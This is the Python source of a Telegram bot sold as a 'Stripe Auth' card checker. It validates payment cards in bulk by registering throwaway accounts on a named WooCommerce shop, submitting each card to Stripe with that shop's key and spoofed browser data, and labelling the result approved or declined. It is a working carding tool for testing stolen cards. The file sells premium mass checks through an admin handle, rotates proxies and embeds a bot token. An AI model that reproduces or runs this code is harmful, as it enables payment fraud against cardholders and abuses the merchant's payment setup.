import json
import asyncio
from datetime import datetime, timedelta
import os
import requests
import re
import random
from typing import Dict, Any, Optional
from faker import Faker

from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

faker = Faker()

# ========================================== CONFIG ================================================

TOKEN = os.environ.get("7770017168:AAFQ8DUaoRcff3cSKQVf7qm1FfJOczpRIRg")  # ← MUST set this in Render dashboard → Environment
if not TOKEN:
    raise ValueError("TOKEN environment variable is required!")

ADMIN_ID = 7162753868  # keep or move to env var too if you want

AUTH_FILE = 'authorized.json'

# Create file if missing
if not os.path.exists(AUTH_FILE):
    with open(AUTH_FILE, 'w') as f:
        json.dump({}, f)

# ========================================== Proxy (optional, unchanged) ================================================

def get_random_proxy():
    try:
        if not os.path.exists("proxy.txt"):
            return None
        with open("proxy.txt", "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]
        if not lines:
            return None
        proxy = random.choice(lines)
        if "@" in proxy:
            auth, address = proxy.split("@", 1)
            user, password = auth.split(":", 1)
            host, port = address.split(":", 1)
            proxy_url = f"http://{user}:{password}@{host}:{port}"
        else:
            host, port = proxy.split(":", 1)
            proxy_url = f"http://{host}:{port}"
        if not port.isdigit():
            return None
        return {"http": proxy_url, "https": proxy_url}
    except Exception:
        return None

# ========================================== CHECKING LOGIC (fixed typos) ================================================

def auto_request(
    url: str,
    method: str = 'GET',
    headers: Optional[Dict[str, str]] = None,
    data: Optional[Dict[str, Any]] = None,
    params: Optional[Dict[str, Any]] = None,
    json_data: Optional[Dict[str, Any]] = None,
    dynamic_params: Optional[Dict[str, Any]] = None,
    session: Optional[requests.Session] = None
) -> requests.Response:
    clean_headers = {}
    if headers:
        for key, value in headers.items():
            if key.lower() != 'cookie':
                clean_headers[key] = value

    if data is None:
        data = {}
    if params is None:
        params = {}
    if dynamic_params:
        for key, value in dynamic_params.items():
            if 'ajax' in key.lower():
                params[key] = value
            else:
                data[key] = value

    req_session = session if session else requests.Session()
    request_kwargs = {
        'url': url,
        'headers': clean_headers,
        'data': data if data else None,
        'params': params if params else None,
        'json': json_data,
        'cookies': {}
    }
    request_kwargs = {k: v for k, v in request_kwargs.items() if v is not None}

    response = req_session.request(method, **request_kwargs)
    response.raise_for_status()
    return response

def check_card(card):
    try:
        parts = card.strip().split('|')
        if len(parts) != 4:
            return None
        cc, mon, yy, cvv = parts
        if not (cc.isdigit() and mon.isdigit() and yy.isdigit() and cvv.isdigit()):
            return None
        if len(cc) < 13 or len(cc) > 16:
            return None
        if not (1 <= int(mon) <= 12):
            return None
        if len(yy) == 2:
            yy = "20" + yy
        raz = cc[:6]
        return {
            "cc": cc,
            "mm": mon.zfill(2),
            "yy": yy,
            "cvv": cvv,
            "bin": raz
        }
    except Exception:
        return None

def get_bin_info(bin_num):
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_num}")
        if response.status_code == 200:
            data = response.json()
            return {
                'brand': data.get('scheme', 'Unknown'),
                'type': data.get('type', 'Credit'),
                'level': data.get('brand', 'Standard'),
                'country': data.get('country', {}).get('name', 'Unknown'),
                'emoji': data.get('country', {}).get('emoji', '🇺🇸'),
                'bank': data.get('bank', {}).get('name', 'Unknown')
            }
    except:
        pass
    return {'brand': 'Unknown', 'type': 'Credit', 'level': 'Standard', 'country': 'US', 'emoji': '🇺🇸', 'bank': 'Unknown Bank'}

def run_automated_process(cc, cvv, yy, mon, user_ag, client_element, guid, muid, sid):
    session = requests.Session()
    base_url = 'https://dilaboards.com'

    # 1. GET
    url_1 = f'{base_url}/en/moj-racun/add-payment-method/'
    headers_1 = {
        'User-Agent': user_ag,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Alt-Used': 'dilaboards.com',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
    }

    try:
        response_1 = auto_request(url_1, method='GET', headers=headers_1, session=session)
        register_nonce = re.findall('name="woocommerce-register-nonce" value="(.*?)"', response_1.text)[0]
        pk = re.findall('"key":"(.*?)"', response_1.text)[0]
        time.sleep(random.uniform(1.0, 3.0))
    except Exception:
        return {"status": "ERROR", "bin": cc[:6]}

    # 2. POST register
    url_2 = url_1  # same endpoint
    headers_2 = {
        'User-Agent': user_ag,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': base_url,
        'Alt-Used': 'dilaboards.com',
        'Connection': 'keep-alive',
        'Referer': url_1,
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
    }

    data_2 = {
        'email': faker.email(domain="gmail.com"),  # fixed typo gamil → gmail
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': url_1,
        'wc_order_attribution_session_start_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'wc_order_attribution_session_pages': '2',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': user_ag,
        'woocommerce-register-nonce': register_nonce,
        '_wp_http_referer': '/en/moj-racun/add-payment-method/',
        'register': 'Register',
    }

    try:
        response_2 = auto_request(url_2, method='POST', headers=headers_2, data=data_2, session=session)
        ajax_nonce = re.findall('"createAndConfirmSetupIntentNonce":"(.*?)"', response_2.text)[0]
        time.sleep(random.uniform(1.0, 3.0))
    except Exception:
        return {"status": "DECLINED🚫", "bin": cc[:6]}

    # 3. Stripe payment_method
    url_3 = 'https://api.stripe.com/v1/payment_methods'
    headers_3 = {
        'User-Agent': user_ag,
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://js.stripe.com/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://js.stripe.com',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Priority': 'u=1, i',
    }

    data_3 = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_year]': yy,
        'card[exp_month]': mon,
        'allow_redisplay': 'unspecified',
        'billing_details[address][postal_code]': '11081',
        'billing_details[address][country]': 'US',
        'payment_user_agent': 'stripe.js/c264a67020; stripe-js-v3/c264a67020; payment-element; deferred-intent',
        'referrer': f'{base_url}',
        'time_on_page': str(random.randint(100000, 999999)),
        'client_attribution_metadata[client_session_id]': client_element,
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'client_attribution_metadata[elements_session_config_id]': client_element,
        'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'key': pk,
        '_stripe_version': '2024-06-20',
    }

    try:
        response_3 = auto_request(url_3, method='POST', headers=headers_3, data=data_3, session=session)
        pm = response_3.json()['id']
        time.sleep(random.uniform(1.0, 3.0))
    except Exception:
        return {"status": "DECLINED🚫", "bin": cc[:6]}

    # 4. Final wc-ajax
    url_4 = f'{base_url}/en/'
    headers_4 = {
        'User-Agent': user_ag,
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': base_url,
        'Alt-Used': 'dilaboards.com',
        'Connection': 'keep-alive',
        'Referer': url_1,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }

    dynamic_params_4 = {
        'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pm,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': ajax_nonce,
    }

    try:
        response_4 = auto_request(
            url_4,
            method='POST',
            headers=headers_4,
            dynamic_params=dynamic_params_4,
            session=session
        )
        data = response_4.json()
        if data.get("success") and data.get("data", {}).get("status") == "succeeded":
            status = "APPROVED✅"
        elif data.get("success") and data.get("data", {}).get("status") == "requires_action":
            status = "3D SECURE🟡"
        else:
            status = "DECLINED🚫"
    except Exception:
        status = "DECLINED🚫"

    return {"status": status, "bin": cc[:6]}

# ========================================== BOT HELPERS ================================================

def get_user_status(user_id):
    try:
        with open(AUTH_FILE, 'r') as f:
            auth_data = json.load(f)
        user_id_str = str(user_id)
        if user_id_str in auth_data:
            exp_date = datetime.fromisoformat(auth_data[user_id_str])
            if datetime.now() < exp_date:
                return exp_date
            else:
                del auth_data[user_id_str]
                with open(AUTH_FILE, 'w') as f:
                    json.dump(auth_data, f)
    except Exception as e:
        print(f"Error reading auth file: {e}")
    return 'FREE'

def extract_cards(update: Update):
    text = update.message.text
    command = text.split()[0]
    cards_text = text[len(command):].strip()
    cards = [line.strip() for line in cards_text.split('\n') if line.strip()]
    return cards

# ========================================== HANDLERS (unchanged texts) ================================================

async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_message = """* 💳♨️ S T R I P E A U T H ♨️💳*\n
🤓 *Heya*👋\n
❎ /st *→* Single Card Check (*Free*)\n
♻️ /mchk *→* Mass Check (*Premium*)\n
🆔 /info *→* Check User Status \n
🖥 Admin *→* @rashunter44"""
    await update.message.reply_text(welcome_message, parse_mode="Markdown")

async def info_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    status = get_user_status(user_id)
    USER = "🚫FREE" if status == "FREE" else "🎉PREMIUM"
    if USER == "🚫FREE":
        msg = "🚫 FREE USER ⚠️"
    else:
        days_left = (status - datetime.now()).days
        msg = f"🎉 PREMIUM USER ✅ → {days_left} Days Left!"
    await update.message.reply_text(msg)

async def auth_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text("You are not authorized to use this command🔐")
        return
    args = context.args
    if len(args) != 2:
        await update.message.reply_text("Usage: /auth telegram_ID days")
        return
    try:
        auth_user_id = int(args[0])
        days = int(args[1])
        exp_date = datetime.now() + timedelta(days=days)
        with open(AUTH_FILE, 'r+') as f:
            auth_data = json.load(f)
            auth_data[str(auth_user_id)] = exp_date.isoformat()
            f.seek(0)
            json.dump(auth_data, f)
            f.truncate()
        await update.message.reply_text(f"User {auth_user_id} authorized for {days} days.")
    except ValueError:
        await update.message.reply_text("Invalid arguments. Use numbers for ID and days.")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

async def st_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    status = get_user_status(user_id)
    USER = "🚫FREE" if status == "FREE" else "🎉PREMIUM"
    cards = extract_cards(update)
    if len(cards) != 1:
        await update.message.reply_text("For /st, provide a card like:\n/st CC|MM|YY|CVV")
        return
    await update.message.reply_text("⏳ Please wait! Checking cc…")
    await asyncio.sleep(2)
    card = cards[0]
    card_data = check_card(card)
    if not card_data:
        await update.message.reply_text("❌ Invalid card format!")
        return
    result = run_automated_process(
        cc=card_data["cc"],
        mon=card_data["mm"],
        yy=card_data["yy"],
        cvv=card_data["cvv"],
        user_ag="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        client_element="fake_client_element",
        guid=str(random.getrandbits(128)),
        muid=str(random.getrandbits(128)),
        sid=str(random.getrandbits(128))
    )
    status_msg = result["status"]
    bin_info = result["bin"]
    response = f"""✅ STRIPE AUTH\n
💳 {card}
♻️ Result → {status_msg}
🌐 BIN → {bin_info}
👤 User → {USER}
🖥 Admin → @rashunter44"""
    await update.message.reply_text(response)
    await update.message.reply_text("Checks Completed⌛️")

async def mchk_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    status = get_user_status(user_id)
    USER = "FREE" if status == "FREE" else "🎉PREMIUM"
    if USER == "FREE":
        await update.message.reply_text("🔐 Premium only!\nContact Admin → @rashunter44")
        return
    cards = extract_cards(update)
    if not cards:
        await update.message.reply_text("Provide cards like:\n/mchk CC|MM|YY|CVV (one per line)")
        return
    if len(cards) > 20:
        await update.message.reply_text("Maximum Limit 20")
        return
    await update.message.reply_text("⏳ Please wait! Checking cc…")
    await asyncio.sleep(2)
    for card in cards:
        card_data = check_card(card)
        if not card_data:
            await update.message.reply_text(f"Invalid format → {card}")
            continue
        result = run_automated_process(
            cc=card_data["cc"],
            mon=card_data["mm"],
            yy=card_data["yy"],
            cvv=card_data["cvv"],
            user_ag="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            client_element="fake_client_element",
            guid=str(random.getrandbits(128)),
            muid=str(random.getrandbits(128)),
            sid=str(random.getrandbits(128))
        )
        status_msg = result["status"]
        bin_info = result["bin"]
        response = f"""✅ STRIPE AUTH\n
💳 {card}
♻️ Result → {status_msg}
🌐 BIN → {bin_info}
👤 User → {USER}
🖥 Admin → @rashunter44"""
        await update.message.reply_text(response)
    await update.message.reply_text("Checks Completed⌛️")

# ========================================== MAIN (webhook mode) ================================================

async def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start_handler))
    app.add_handler(CommandHandler("info", info_handler))
    app.add_handler(CommandHandler("auth", auth_handler))
    app.add_handler(CommandHandler("st", st_handler))
    app.add_handler(CommandHandler("mchk", mchk_handler))

    # Clean old webhook
    await app.bot.delete_webhook(drop_pending_updates=True)

    # Build webhook URL using Render's provided hostname
    hostname = os.environ.get("bolon")
    if not hostname:
        raise ValueError("RENDER_EXTERNAL_HOSTNAME not found — are you running on Render?")
    webhook_url = f"https://{hostname}/{TOKEN}"

    print(f"Setting webhook → {webhook_url}")
    await app.bot.set_webhook(
        url=webhook_url,
        allowed_updates=Update.ALL_TYPES
    )

    PORT = int(os.environ.get("PORT", "8443"))

    await app.run_webhook(
        listen="0.0.0.0",
        port=PORT,
        url_path=TOKEN,
        webhook_url=webhook_url
    )

if __name__ == '__main__':
    print("\n[+]Bot Starting (Webhook mode)...\n")
    asyncio.run(main())
